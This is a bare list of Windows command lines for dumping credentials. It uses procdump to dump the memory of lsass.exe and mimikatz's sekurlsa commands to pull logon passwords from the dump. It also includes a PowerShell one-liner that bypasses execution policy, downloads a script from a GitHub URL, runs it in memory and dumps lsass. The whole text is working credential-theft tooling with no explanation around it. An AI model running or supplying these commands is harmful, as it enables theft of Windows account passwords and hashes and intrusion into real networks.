	>procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
	>procdump.exe -accepteula -ma lsass.exe lsass.dmp
	>mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
	>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'"